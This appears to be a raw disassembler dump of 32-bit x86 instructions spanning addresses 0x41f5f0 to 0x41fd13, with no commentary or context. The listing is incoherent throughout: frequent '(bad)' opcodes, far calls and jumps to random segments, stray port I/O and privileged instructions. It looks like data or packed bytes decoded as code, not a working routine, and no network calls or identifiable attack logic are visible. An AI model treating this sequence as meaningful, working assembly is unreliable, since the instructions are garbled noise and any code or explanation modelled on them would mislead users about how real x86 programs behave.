  41f5f0:	inc    ebp
  41f5f1:	test   al,0xcf
  41f5f3:	dec    ebx
  41f5f4:	push   esi
  41f5f5:	xor    eax,0xe254a3ba
  41f5fa:	dec    eax
  41f5fb:	ins    BYTE PTR es:[edi],dx
  41f5fc:	inc    ebp
  41f5fd:	bound  esi,QWORD PTR [ebx]
  41f5ff:	mov    ds:0x1e010583,al
  41f604:	loopne 0x41f681
  41f606:	cli    
  41f607:	dec    ebp
  41f608:	dec    esi
  41f609:	and    al,BYTE PTR [ebp+0x6b8ba101]
  41f60f:	mov    dh,0xb9
  41f611:	call   0x3363:0x8ae5a576
  41f618:	add    edx,DWORD PTR ds:0xe3f91983
  41f61e:	(bad)  
  41f620:	iret   
  41f621:	push   ebx
  41f622:	inc    edi
  41f623:	inc    edi
  41f624:	bound  edx,QWORD PTR [ebx]
  41f626:	sub    DWORD PTR [edi+0x5dcd5f5f],esi
  41f62c:	int    0x98
  41f62e:	sbb    DWORD PTR [ecx+0x62c1e86f],edi
  41f634:	or     DWORD PTR [ecx],ecx
  41f636:	stc    
  41f637:	test   eax,0x7e1f2b73
  41f63c:	mov    al,0x87
  41f63e:	out    0x78,al
  41f640:	push   eax
  41f641:	ins    DWORD PTR es:[edi],dx
  41f642:	jmp    0x42c34b2b
  41f647:	or     ecx,DWORD PTR [edi]
  41f649:	or     ebp,DWORD PTR [edi]
  41f64b:	cmp    ebp,ebx
  41f64d:	jnp    0x41f683
  41f64f:	xchg   ebx,eax
  41f650:	das    
  41f651:	sahf   
  41f652:	mov    esi,0x88cbae7
  41f657:	jmp    DWORD PTR [ebp-0x6c6c92a9]
  41f65d:	(bad)  
  41f65e:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  41f660:	sbb    BYTE PTR [eax],ch
  41f662:	outs   dx,DWORD PTR ds:[esi]
  41f663:	cdq    
  41f664:	jne    0x41f5ff
  41f666:	xchg   esi,eax
  41f667:	(bad)  
  41f668:	push   ebp
  41f669:	dec    esi
  41f66a:	es pusha 
  41f66c:	fwait
  41f66d:	or     bh,BYTE PTR [esi]
  41f66f:	jmp    0x41f603
  41f671:	mov    bh,0x53
  41f673:	inc    ecx
  41f674:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f675:	retf   0x20d9
  41f678:	adc    bl,BYTE PTR [eax]
  41f67a:	stos   BYTE PTR es:[edi],al
  41f67b:	test   eax,0x33f0b3df
  41f680:	mov    dh,0x3a
  41f682:	dec    edi
  41f683:	cmp    esp,DWORD PTR [esi+0x75]
  41f686:	fcmovb st,st(6)
  41f688:	jle    0x41f650
  41f68a:	test   BYTE PTR [ecx+0x79],dh
  41f68d:	mov    fs,ebp
  41f68f:	add    BYTE PTR [edx+ebp*8],0x7d
  41f693:	cmovo  esp,DWORD PTR [ecx]
  41f696:	xor    ebp,eax
  41f698:	out    0xf9,eax
  41f69a:	mov    WORD PTR [ebp-0x1f],?
  41f69d:	gs test dh,bh
  41f6a0:	xlat   BYTE PTR ds:[ebx]
  41f6a1:	out    0xe5,al
  41f6a3:	retf   
  41f6a4:	mov    ebx,0x59ca3101
  41f6a9:	push   eax
  41f6aa:	(bad)  
  41f6ab:	(bad)  
  41f6ad:	cmp    al,0x2
  41f6af:	add    dh,BYTE PTR [eax]
  41f6b1:	mov    ecx,0xd304aac2
  41f6b6:	retf   
  41f6b7:	stc    
  41f6b8:	popf   
  41f6b9:	imul   ecx,DWORD PTR [edx+0x43],0x8ccbf919
  41f6c0:	jb     0x41f726
  41f6c2:	cmp    bl,bl
  41f6c4:	push   ebx
  41f6c5:	lods   eax,DWORD PTR ds:[esi]
  41f6c6:	jp     0x41f704
  41f6c8:	dec    esp
  41f6c9:	mov    ah,0xcb
  41f6cb:	inc    edi
  41f6cc:	fdiv   st,st(2)
  41f6ce:	not    BYTE PTR [edi]
  41f6d0:	mov    esp,0x4c9b0e41
  41f6d5:	js     0x41f696
  41f6d7:	add    edx,0x808eda21
  41f6dd:	lea    ebx,[edi]
  41f6df:	hlt    
  41f6e0:	daa    
  41f6e1:	ret    0xbf8c
  41f6e4:	mov    ds:0xf75ddd9a,al
  41f6e9:	int    0x72
  41f6eb:	cmp    eax,0x15bbd952
  41f6f0:	mov    esi,0xef19ec81
  41f6f5:	push   ebx
  41f6f6:	mov    cl,0x2e
  41f6f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f6f9:	(bad)  
  41f6fb:	inc    eax
  41f6fc:	clc    
  41f6fd:	ret    0xb267
  41f700:	and    BYTE PTR [ecx+esi*1+0x16857954],ah
  41f707:	jne    0x41f6a5
  41f709:	jp     0x41f788
  41f70b:	out    0x6f,al
  41f70d:	or     DWORD PTR [ecx],0xffffff98
  41f710:	je     0x41f6bc
  41f712:	cmp    eax,0xc87986dd
  41f717:	adc    dh,BYTE PTR [edi]
  41f719:	xchg   esp,eax
  41f71a:	xchg   ebp,eax
  41f71b:	test   eax,0x1be1c23e
  41f720:	idiv   BYTE PTR [ecx]
  41f722:	push   eax
  41f723:	adc    dl,BYTE PTR [edi-0x35]
  41f726:	dec    esp
  41f727:	in     al,dx
  41f728:	sbb    esi,ebp
  41f72a:	gs pop ebx
  41f72c:	loope  0x41f71d
  41f72e:	arpl   cx,ax
  41f730:	fwait
  41f731:	imul   ecx,DWORD PTR [edi],0xbc686441
  41f737:	lock imul ebx,edx,0xe8475d0d
  41f73e:	or     al,0x4f
  41f740:	rcr    DWORD PTR [ebx-0x37a3c9b2],cl
  41f746:	push   esp
  41f747:	icebp  
  41f748:	test   al,0xc0
  41f74a:	pop    ds
  41f74b:	sahf   
  41f74c:	sbb    BYTE PTR [ecx+eax*4],cl
  41f74f:	out    0xc5,eax
  41f751:	push   edx
  41f752:	add    eax,0x52c42ef3
  41f757:	pop    eax
  41f758:	stos   BYTE PTR es:[edi],al
  41f759:	mov    cl,0x4f
  41f75b:	das    
  41f75c:	fdivr  QWORD PTR [edi]
  41f75e:	push   es
  41f75f:	imul   ebp,ebp,0xf779309
  41f765:	cmp    edi,DWORD PTR [edi+0x59]
  41f768:	inc    edx
  41f769:	jmp    0x41f739
  41f76b:	jb     0x41f70d
  41f76d:	dec    esp
  41f76e:	jbe    0x41f784
  41f770:	fwait
  41f771:	pop    eax
  41f772:	push   edi
  41f773:	call   0x993ec73e
  41f778:	adc    BYTE PTR [ebp+0x4d7f530],bl
  41f77e:	dec    esp
  41f77f:	jmp    0xcdc1:0xe4cc6360
  41f786:	ror    DWORD PTR [ebx-0x5c710bf5],0x7b
  41f78d:	ja     0x41f771
  41f78f:	jl     0x41f738
  41f791:	in     eax,0x32
  41f793:	icebp  
  41f794:	int3   
  41f795:	enter  0xece9,0x13
  41f799:	jl     0x41f7e2
  41f79b:	popf   
  41f79c:	arpl   WORD PTR [edi+0x79e61171],bx
  41f7a2:	add    ah,BYTE PTR [esi-0x2b39459]
  41f7a8:	addr16 push 0xbeb77d23
  41f7ae:	(bad)  
  41f7af:	ficomp WORD PTR [edi-0x435c638b]
  41f7b5:	cmp    BYTE PTR [eax],bh
  41f7b7:	(bad)  
  41f7b8:	dec    ebx
  41f7b9:	pop    edx
  41f7ba:	test   eax,0x6cb73e6e
  41f7bf:	lds    edx,FWORD PTR [edi]
  41f7c1:	pcmpgtw mm0,QWORD PTR [edi+0x7c]
  41f7c5:	adc    eax,DWORD PTR [esi-0x2fad34e4]
  41f7cb:	push   ebp
  41f7cc:	xor    ah,al
  41f7ce:	sub    al,0xef
  41f7d0:	test   al,0x52
  41f7d2:	cmp    edi,esp
  41f7d4:	aas    
  41f7d5:	out    dx,al
  41f7d6:	xlat   BYTE PTR ds:[ebx]
  41f7d7:	loop   0x41f760
  41f7d9:	jbe    0x41f83b
  41f7db:	cmp    edi,eax
  41f7dd:	mov    BYTE PTR [ecx+0x6d],bh
  41f7e0:	add    dl,BYTE PTR [edx+0x770540b3]
  41f7e6:	mov    edi,0xf40a77f5
  41f7eb:	push   ebp
  41f7ec:	pop    es
  41f7ed:	inc    edx
  41f7ee:	pop    ebx
  41f7ef:	cmp    dh,BYTE PTR [ecx]
  41f7f1:	jne    0x41f77c
  41f7f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f7f4:	pop    edi
  41f7f5:	stos   BYTE PTR es:[edi],al
  41f7f6:	pop    ecx
  41f7f7:	(bad)  
  41f7f8:	aas    
  41f7f9:	mov    bl,0x74
  41f7fb:	test   al,0x8a
  41f7fd:	or     ebx,edi
  41f7ff:	test   al,0x5f
  41f801:	(bad)  
  41f802:	je     0x41f83d
  41f804:	and    eax,0xb904f2bc
  41f809:	in     eax,dx
  41f80a:	inc    BYTE PTR [eax-0x78]
  41f80d:	adc    BYTE PTR [edx],cl
  41f80f:	loopne 0x41f86d
  41f811:	jmp    0xa38cfbbd
  41f816:	mov    esi,0xb0e1389f
  41f81b:	ja     0x41f898
  41f81d:	fwait
  41f81e:	pop    ss
  41f81f:	mov    dl,0xa5
  41f821:	jle    0x41f832
  41f823:	aas    
  41f824:	(bad)  
  41f825:	hlt    
  41f826:	aam    0x97
  41f828:	sar    ah,1
  41f82a:	jb     0x41f81f
  41f82c:	(bad)  
  41f82d:	ins    BYTE PTR es:[edi],dx
  41f82e:	mov    cl,0x54
  41f830:	imul   edi,DWORD PTR fs:[ebp+0x4],0xffffff93
  41f835:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f836:	adc    BYTE PTR [edx-0xe],0xf9
  41f83a:	sub    DWORD PTR [ebp-0x18],edi
  41f83d:	jo     0x41f808
  41f83f:	in     al,0x93
  41f841:	leave  
  41f842:	data16 fidiv WORD PTR [ecx]
  41f845:	mov    dl,0x7e
  41f847:	mov    al,0x98
  41f849:	push   edi
  41f84a:	adc    edi,DWORD PTR [ebx-0x3a]
  41f84d:	rcr    DWORD PTR [eax-0x2c60cf9a],0x42
  41f854:	cmp    eax,0x4ed63c3
  41f859:	daa    
  41f85a:	add    DWORD PTR [edi],ecx
  41f85c:	mov    bl,0x50
  41f85e:	out    dx,al
  41f85f:	clc    
  41f860:	jge    0x41f889
  41f862:	rcr    BYTE PTR [ebx*8+0x2691c1f2],cl
  41f869:	leave  
  41f86a:	xor    edx,DWORD PTR [ebx+0x14]
  41f86d:	mov    dh,0x13
  41f86f:	mov    ecx,0x5ec205c8
  41f874:	popf   
  41f875:	cmp    eax,0x78cce77c
  41f87a:	sbb    BYTE PTR [edx+0x4e],bl
  41f87d:	and    ebp,DWORD PTR [ebx-0x28]
  41f880:	pop    ss
  41f881:	nop
  41f882:	int3   
  41f883:	shr    BYTE PTR [esi-0x30e9c2a0],cl
  41f889:	push   edi
  41f88a:	lods   eax,DWORD PTR ds:[esi]
  41f88b:	jo     0x41f81a
  41f88d:	sahf   
  41f88e:	aad    0x59
  41f890:	fidivr DWORD PTR [ebp+0x5f]
  41f893:	aaa    
  41f894:	adc    edi,DWORD PTR [ebx+0x18a0ea28]
  41f89a:	int    0x6f
  41f89c:	and    ecx,esi
  41f89e:	(bad)  
  41f89f:	jns    0x9a4e0996
  41f8a5:	xchg   esi,eax
  41f8a6:	arpl   WORD PTR [ebp+0x6d],bx
  41f8a9:	sahf   
  41f8aa:	sbb    ebx,esp
  41f8ac:	ja     0x41f884
  41f8ae:	test   bh,dl
  41f8b0:	sbb    al,0xd
  41f8b2:	je     0x41f84f
  41f8b4:	stc    
  41f8b5:	cs aas 
  41f8b7:	(bad)  
  41f8b9:	outs   dx,BYTE PTR ds:[esi]
  41f8ba:	sbb    eax,0x9c3e3b87
  41f8bf:	out    dx,al
  41f8c0:	pop    ebx
  41f8c1:	push   0x296e3471
  41f8c6:	rcl    BYTE PTR [esi+eiz*8+0x4b],1
  41f8ca:	jnp    0x41f892
  41f8cc:	inc    ebx
  41f8cd:	(bad)  
  41f8ce:	dec    BYTE PTR [edx+0x6]
  41f8d1:	mov    bh,0x81
  41f8d3:	ss cmp eax,0x235a841e
  41f8d9:	cld    
  41f8da:	add    eax,edi
  41f8dc:	and    al,0xae
  41f8de:	or     dh,BYTE PTR [ebp+0x45]
  41f8e1:	into   
  41f8e2:	test   BYTE PTR ds:0x7c70a9f4,0x74
  41f8e9:	int    0x1d
  41f8eb:	inc    ecx
  41f8ec:	sbb    DWORD PTR [eax-0x41],ecx
  41f8ef:	dec    edi
  41f8f0:	out    0x48,eax
  41f8f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f8f3:	inc    ecx
  41f8f4:	out    0x67,al
  41f8f6:	outs   dx,BYTE PTR ds:[esi]
  41f8f7:	and    ebp,DWORD PTR [ebp-0x39]
  41f8fa:	fwait
  41f8fb:	scas   al,BYTE PTR es:[edi]
  41f8fc:	mov    WORD PTR [ebp+0x32823311],?
  41f902:	in     eax,0xae
  41f904:	pop    edx
  41f905:	int3   
  41f906:	in     eax,0xf9
  41f908:	mov    WORD PTR [ecx],gs
  41f90a:	shr    BYTE PTR [edi+0x740338a6],1
  41f910:	mov    ebx,0xe0c3a08f
  41f915:	(bad)  
  41f916:	fadd   QWORD PTR [edx]
  41f918:	pop    ebx
  41f919:	daa    
  41f91a:	in     eax,0x30
  41f91c:	hlt    
  41f91d:	call   0x87c8:0xba2e90b7
  41f924:	imul   esi,esp,0xffffffd0
  41f927:	not    DWORD PTR [edx]
  41f929:	stc    
  41f92a:	cwde   
  41f92b:	sbb    BYTE PTR [ebx+ebx*2],dl
  41f92e:	popa   
  41f92f:	and    ah,BYTE PTR [edx]
  41f931:	arpl   WORD PTR [esp+eax*4+0x2d6e6126],si
  41f938:	or     al,0x7f
  41f93a:	fwait
  41f93b:	jp     0x41f8db
  41f93d:	inc    ebp
  41f93e:	dec    ecx
  41f93f:	je     0x41f9c0
  41f941:	sub    al,0xa6
  41f943:	daa    
  41f944:	dec    esi
  41f945:	aas    
  41f946:	adc    ch,BYTE PTR [ebx]
  41f948:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f949:	dec    ebx
  41f94a:	xchg   BYTE PTR [eax],dh
  41f94c:	lods   eax,DWORD PTR ds:[esi]
  41f94d:	jl     0x41f94f
  41f94f:	stos   DWORD PTR es:[edi],eax
  41f950:	rcr    BYTE PTR [ebp+0x44],0xb1
  41f954:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f955:	jno    0x41f9d3
  41f957:	cld    
  41f958:	jbe    0x41f8dc
  41f95a:	js     0x41f9d8
  41f95c:	sti    
  41f95d:	jae    0x41f8e3
  41f95f:	inc    bl
  41f961:	inc    ebx
  41f962:	xor    eax,0x555672f4
  41f967:	adc    ah,BYTE PTR [esi-0x2f]
  41f96a:	xor    ebx,esi
  41f96c:	(bad)  
  41f96f:	data16 aas 
  41f971:	xor    DWORD PTR [edi-0x56],ecx
  41f974:	inc    esi
  41f975:	dec    edx
  41f976:	jg     0x41f969
  41f978:	arpl   ax,di
  41f97a:	(bad)  
  41f97b:	and    al,BYTE PTR ds:0xa017aa00
  41f981:	popf   
  41f982:	fstp   TBYTE PTR [ecx]
  41f984:	fild   DWORD PTR [esi-0x3da840ff]
  41f98a:	retf   0x7531
  41f98d:	xor    bl,BYTE PTR [eax+0x1a]
  41f990:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f991:	mov    bl,dh
  41f993:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f994:	or     bl,ch
  41f996:	daa    
  41f997:	es pop ebx
  41f999:	inc    ebx
  41f99a:	popf   
  41f99b:	shl    bl,1
  41f99d:	and    ch,BYTE PTR ds:0xade95631
  41f9a3:	(bad)  
  41f9a4:	jne    0x41f994
  41f9a6:	jnp    0x41f991
  41f9a8:	js     0x41f93f
  41f9aa:	scas   al,BYTE PTR es:[edi]
  41f9ab:	stos   BYTE PTR es:[edi],al
  41f9ac:	in     eax,0xe5
  41f9ae:	mov    ds:0x67e19fb8,al
  41f9b3:	inc    ebx
  41f9b4:	add    BYTE PTR [eax-0x34b6de33],0xbb
  41f9bb:	(bad)  
  41f9bd:	cmc    
  41f9be:	cld    
  41f9bf:	sub    esp,DWORD PTR [edx]
  41f9c1:	les    ebx,FWORD PTR [eax]
  41f9c3:	inc    edi
  41f9c4:	rcr    ebx,cl
  41f9c6:	call   0x7f21b26b
  41f9cb:	xor    eax,0xb4f08cbb
  41f9d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f9d1:	dec    edx
  41f9d2:	sub    ebp,DWORD PTR [esi]
  41f9d4:	not    BYTE PTR [eax-0x6b]
  41f9d7:	icebp  
  41f9d8:	pop    esp
  41f9d9:	in     al,0x50
  41f9db:	mov    eax,ds:0xde7a8379
  41f9e0:	jp     0x41f9f6
  41f9e2:	icebp  
  41f9e3:	cmp    BYTE PTR [edi],0x65
  41f9e6:	mov    eax,ds:0x4e9b2ae7
  41f9eb:	mov    esp,0x564d8197
  41f9f0:	xchg   DWORD PTR [edx-0xc],ebp
  41f9f3:	xlat   BYTE PTR ds:[ebx]
  41f9f4:	das    
  41f9f5:	stos   BYTE PTR es:[edi],al
  41f9f6:	cmc    
  41f9f7:	mov    ebp,0xd13cf560
  41f9fc:	imul   ebp,DWORD PTR [ebp-0x655598cb],0xffffffe8
  41fa03:	(bad)
  41fa06:	jne    0x41f9f7
  41fa08:	jge    0x41f98a
  41fa0a:	sub    al,0xdd
  41fa0c:	cmp    al,0x41
  41fa0e:	pminub mm0,QWORD PTR [eax+0x73f08015]
  41fa15:	pop    es
  41fa16:	and    eax,0xf226e7ce
  41fa1b:	ja     0x41fa58
  41fa1d:	mov    dl,0x9e
  41fa1f:	pushf  
  41fa20:	pop    ebx
  41fa21:	sbb    eax,0xf411e647
  41fa26:	adc    al,0x9f
  41fa28:	inc    ebp
  41fa29:	jp     0x41fa1a
  41fa2b:	aad    0xa6
  41fa2d:	in     al,dx
  41fa2e:	iret   
  41fa2f:	enter  0xd66,0x66
  41fa33:	cmp    eax,0x7a7ed3fc
  41fa38:	adc    al,0x82
  41fa3a:	xor    BYTE PTR [edx+ecx*1-0x2f],dl
  41fa3e:	test   al,0xf6
  41fa40:	imul   edi,DWORD PTR [eax-0x3d],0xc
  41fa44:	sbb    ch,BYTE PTR ds:0x68b7afb9
  41fa4a:	adc    eax,0xa3cd498e
  41fa4f:	cld    
  41fa50:	stos   BYTE PTR es:[edi],al
  41fa51:	add    BYTE PTR [esi-0x3a],dl
  41fa54:	dec    edx
  41fa55:	out    0x2a,eax
  41fa57:	loopne 0x41fa9f
  41fa59:	ret    0xf635
  41fa5c:	jg     0x41fa29
  41fa5e:	lods   al,BYTE PTR ds:[esi]
  41fa5f:	daa    
  41fa60:	rol    DWORD PTR ds:0xdf15fedc,1
  41fa66:	xor    ebp,ebp
  41fa68:	lods   al,BYTE PTR ds:[esi]
  41fa69:	cmp    BYTE PTR [esi],ch
  41fa6b:	sbb    BYTE PTR [ebx-0x5d914494],cl
  41fa71:	addr16 mov al,0xa3
  41fa74:	dec    ebx
  41fa75:	aas    
  41fa76:	pop    esp
  41fa77:	inc    ecx
  41fa78:	jmp    0xe178:0xac9f6f82
  41fa7f:	mov    ebx,0x73c49cba
  41fa84:	sub    DWORD PTR [edx],edx
  41fa86:	pop    es
  41fa87:	mov    ds:0xe1cc82d,al
  41fa8c:	add    eax,0x6b07d131
  41fa91:	push   es
  41fa92:	inc    edx
  41fa93:	mov    ch,BYTE PTR [esp+ecx*8]
  41fa96:	dec    ecx
  41fa97:	pop    edx
  41fa98:	sub    al,0xa3
  41fa9a:	pop    edx
  41fa9b:	out    0x63,al
  41fa9d:	and    DWORD PTR [edx],edi
  41fa9f:	or     ebp,DWORD PTR [ebx+0x4b051fab]
  41faa5:	push   ebp
  41faa6:	je     0x41fb08
  41faa8:	jb     0x41fb18
  41faaa:	arpl   WORD PTR [ebx+0x3c],si
  41faad:	or     cl,BYTE PTR [eax]
  41faaf:	inc    ebx
  41fab0:	daa    
  41fab1:	lea    ecx,[ebx]
  41fab3:	lods   eax,DWORD PTR ds:[esi]
  41fab4:	pop    ebp
  41fab5:	xchg   edx,eax
  41fab6:	(bad)  
  41fab8:	jg     0x41faa4
  41faba:	stos   BYTE PTR es:[edi],al
  41fabb:	jo     0x41fb23
  41fabd:	mov    dh,0x86
  41fabf:	cmp    BYTE PTR [ecx+0x21e74e4d],al
  41fac5:	adc    bl,BYTE PTR [esi]
  41fac7:	shl    BYTE PTR [edi+0x5c],cl
  41faca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41facb:	mov    fs,WORD PTR [esi-0x67]
  41face:	loopne 0x41fb1b
  41fad0:	push   ecx
  41fad1:	stos   DWORD PTR es:[edi],eax
  41fad2:	jbe    0x41fb31
  41fad4:	mov    edx,0xfbfedf60
  41fad9:	fwait
  41fada:	retf   0xc938
  41fadd:	inc    ecx
  41fade:	imul   edx,DWORD PTR [edx],0x6b
  41fae1:	mov    ch,0x3e
  41fae4:	(bad)  
  41fae5:	daa    
  41fae6:	data16 int3 
  41fae8:	cmp    eax,0xc55bc142
  41faed:	dec    edx
  41faee:	xor    bl,bh
  41faf0:	xchg   BYTE PTR [esi],dl
  41faf2:	fsub   QWORD PTR [edx]
  41faf4:	mov    dh,0xeb
  41faf6:	test   eax,0xb5f96289
  41fafb:	daa    
  41fafc:	or     al,0xcd
  41fafe:	mov    dh,0xfa
  41fb00:	xlat   BYTE PTR ds:[ebx]
  41fb01:	mov    cl,0xb9
  41fb03:	shr    BYTE PTR [edi],1
  41fb05:	inc    DWORD PTR [eax-0x661a0b7]
  41fb0b:	xchg   esp,eax
  41fb0c:	xor    ecx,DWORD PTR [ebx]
  41fb0e:	mov    edx,0x3a3ae406
  41fb13:	repnz sbb ah,BYTE PTR [ebp-0x7d]
  41fb17:	or     al,0x6b
  41fb19:	imul   ecx,DWORD PTR [ebx-0x16094dec],0x125b7e34
  41fb23:	shl    DWORD PTR [eax],1
  41fb25:	setg   al
  41fb28:	lea    esp,[eax+0x3b]
  41fb2b:	add    BYTE PTR [ebp+0x3],dh
  41fb2e:	stc    
  41fb2f:	mov    ebx,gs
  41fb31:	mov    eax,ds:0x377e49c8
  41fb36:	(bad)  
  41fb37:	sahf   
  41fb38:	shr    BYTE PTR ds:0x83ff936f,1
  41fb3e:	pop    es
  41fb3f:	pusha  
  41fb40:	in     eax,0xee
  41fb42:	bound  esi,QWORD PTR [ecx+0x9]
  41fb45:	jo     0x41fb62
  41fb47:	mov    ecx,edx
  41fb49:	push   ds
  41fb4a:	enter  0x538a,0x9a
  41fb4e:	push   edx
  41fb4f:	or     al,BYTE PTR [edi+0x21]
  41fb52:	mov    ds,WORD PTR [ebx+0x53e1f875]
  41fb58:	test   eax,0xa6e2600c
  41fb5d:	push   ss
  41fb5e:	sbb    edi,DWORD PTR [ebp-0x23]
  41fb61:	cs and eax,0x9fff5fea
  41fb67:	rcl    BYTE PTR [edi],1
  41fb69:	inc    esi
  41fb6a:	inc    ebx
  41fb6b:	adc    al,0xe6
  41fb6d:	retf   
  41fb6e:	xor    edi,DWORD PTR [edx+ebp*8-0x2a9e63bc]
  41fb75:	xchg   ecx,eax
  41fb76:	xor    DWORD PTR [ebp+0x4e],ecx
  41fb79:	popa   
  41fb7a:	push   ss
  41fb7b:	push   es
  41fb7c:	adc    ebp,DWORD PTR [ebx+0xd]
  41fb7f:	and    DWORD PTR [esi-0x239430b8],ecx
  41fb85:	lds    esp,FWORD PTR [esi+0x9]
  41fb88:	lahf   
  41fb89:	rol    BYTE PTR [esi+eiz*1-0x1b],1
  41fb8d:	and    edx,esp
  41fb8f:	xchg   BYTE PTR [edi],al
  41fb91:	sub    DWORD PTR [edx],0x30287ba9
  41fb97:	xchg   ecx,eax
  41fb98:	and    BYTE PTR [ebx+0x3f76a1d8],dl
  41fb9e:	mov    esp,0x19deab2f
  41fba3:	loop   0x41fb30
  41fba5:	mov    dh,0x44
  41fba7:	xor    DWORD PTR [edx],esp
  41fba9:	sbb    dl,BYTE PTR [edx-0x5fcb64c8]
  41fbaf:	out    dx,eax
  41fbb0:	test   BYTE PTR [eax-0x19747218],ah
  41fbb6:	mov    al,0xa3
  41fbb8:	mov    dl,0xdc
  41fbba:	push   eax
  41fbbb:	scas   eax,DWORD PTR es:[edi]
  41fbbc:	cmp    al,0x9c
  41fbbe:	xlat   BYTE PTR ds:[ebx]
  41fbbf:	(bad)  
  41fbc0:	and    ebx,ecx
  41fbc2:	inc    esp
  41fbc3:	sbb    eax,DWORD PTR [eax+0x2be0e490]
  41fbc9:	adc    edi,ebp
  41fbcb:	shr    dh,1
  41fbcd:	pushf  
  41fbce:	scas   al,BYTE PTR es:[edi]
  41fbcf:	dec    edi
  41fbd0:	cs cs lahf 
  41fbd3:	adc    cl,BYTE PTR cs:[ebx-0x5cb2cfa4]
  41fbda:	fnstenv [eax+0x4f10c512]
  41fbe0:	xchg   edi,eax
  41fbe1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fbe2:	sti    
  41fbe3:	lock (bad) 
  41fbe5:	push   eax
  41fbe6:	fs (bad) 
  41fbe8:	xor    ch,BYTE PTR ds:0x89729c8e
  41fbee:	jo     0x41fc19
  41fbf0:	retf   
  41fbf1:	jmp    0xb996:0x7960f0ed
  41fbf8:	gs or  eax,ebp
  41fbfb:	push   ds
  41fbfc:	or     al,0x34
  41fbfe:	pop    ds
  41fbff:	cmp    BYTE PTR [esi+edi*8],bh
  41fc02:	test   eax,eax
  41fc04:	push   ebp
  41fc05:	sbb    ebx,DWORD PTR [ecx]
  41fc07:	cmp    eax,0xfdb62ae6
  41fc0c:	xor    eax,0x7d49ede7
  41fc11:	push   eax
  41fc12:	xor    DWORD PTR [bx+0xacc],eax
  41fc17:	or     BYTE PTR [ebp-0x5ca0b094],dh
  41fc1d:	mov    esp,0xf41f4ff9
  41fc22:	mov    dh,0x74
  41fc24:	xor    BYTE PTR [edx+edx*4],dh
  41fc27:	pop    ebp
  41fc28:	xchg   DWORD PTR [eax+0x644f3847],edi
  41fc2e:	and    DWORD PTR [ebx+0x3a],ebp
  41fc31:	xchg   edx,eax
  41fc32:	cmp    DWORD PTR [ebx],esi
  41fc34:	inc    eax
  41fc35:	dec    edx
  41fc36:	stc    
  41fc37:	and    dl,BYTE PTR [esi+0x46]
  41fc3a:	ror    BYTE PTR [edi+esi*2],0xb3
  41fc3e:	mov    eax,0x830f15fc
  41fc43:	push   esi
  41fc44:	in     eax,0xe6
  41fc46:	dec    ecx
  41fc47:	adc    DWORD PTR [esi],ebp
  41fc49:	mov    eax,ds:0x7036e4a2
  41fc4e:	fisttp QWORD PTR [ebp-0x1b]
  41fc51:	add    eax,0x3ad1b1a6
  41fc56:	clc    
  41fc57:	vmwrite eax,DWORD PTR [ecx]
  41fc5a:	ja     0x41fc59
  41fc5c:	xchg   esp,eax
  41fc5d:	mov    ebp,eax
  41fc5f:	aaa    
  41fc60:	jecxz  0x41fcb4
  41fc62:	ds iret 
  41fc64:	jle    0x41fc11
  41fc66:	push   edx
  41fc67:	mov    eax,ds:0x7dcd36d4
  41fc6c:	mov    esi,ebx
  41fc6e:	push   ds
  41fc6f:	and    eax,0xab9323e4
  41fc74:	in     al,0xfd
  41fc76:	mov    DWORD PTR [bp+si],edx
  41fc79:	jmp    0x59be079a
  41fc7e:	(bad)  
  41fc7f:	arpl   WORD PTR [edi-0x59447ca6],cx
  41fc85:	out    0x2,eax
  41fc87:	xchg   esi,eax
  41fc88:	popf   
  41fc89:	and    DWORD PTR [edi],ebx
  41fc8b:	jle    0x41fc48
  41fc8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc8e:	lods   eax,DWORD PTR ds:[esi]
  41fc8f:	iret   
  41fc90:	add    BYTE PTR [ebp+0x15],0x1d
  41fc94:	mov    al,ds:0xe2b53352
  41fc99:	sbb    ch,BYTE PTR [ecx+ebx*1-0x79]
  41fc9d:	mov    esi,0xe79ad4f4
  41fca2:	or     BYTE PTR [ebx-0x4f],dh
  41fca5:	pop    ss
  41fca6:	(bad)  
  41fca7:	or     al,0x19
  41fca9:	pop    ds
  41fcaa:	xchg   ecx,eax
  41fcab:	mov    WORD PTR [esi+0x4bff425f],ds
  41fcb1:	(bad)  
  41fcb3:	dec    esi
  41fcb4:	adc    bh,dl
  41fcb6:	fbld   TBYTE PTR [esi-0x30]
  41fcb9:	mov    ebx,0xab5ee011
  41fcbe:	push   eax
  41fcbf:	je     0x41fc4d
  41fcc1:	call   0xbb35b075
  41fcc6:	inc    ebp
  41fcc7:	(bad)
  41fcca:	dec    ebp
  41fccb:	sahf   
  41fccc:	in     eax,dx
  41fccd:	push   0x8
  41fccf:	cmp    al,0x3a
  41fcd1:	dec    ebp
  41fcd2:	adc    al,0x18
  41fcd4:	lock mov dl,BYTE PTR [eax-0x60456e25]
  41fcdb:	push   edi
  41fcdc:	test   eax,0x9a1ea708
  41fce1:	mov    bl,0x1e
  41fce3:	popa   
  41fce4:	cmp    eax,DWORD PTR [edx+0x31]
  41fce7:	pop    ebx
  41fce8:	and    bh,cl
  41fcea:	mov    bh,0xca
  41fcec:	(bad)  
  41fced:	cmp    al,0x32
  41fcef:	inc    ecx
  41fcf0:	or     al,0xf1
  41fcf2:	xchg   esp,eax
  41fcf3:	call   0x983:0x83818966
  41fcfa:	aad    0x8e
  41fcfc:	sub    bl,BYTE PTR [esi]
  41fcfe:	fcomp  DWORD PTR ds:0x57f7439a
  41fd04:	cmp    esp,DWORD PTR [esi+ecx*8]
  41fd07:	rcr    dl,0x23
  41fd0a:	in     eax,dx
  41fd0b:	(bad)  
  41fd0c:	adc    eax,0xec347393
  41fd11:	rol    ecx,1
  41fd13:	lods   al,BYTE PTR ds:[esi]
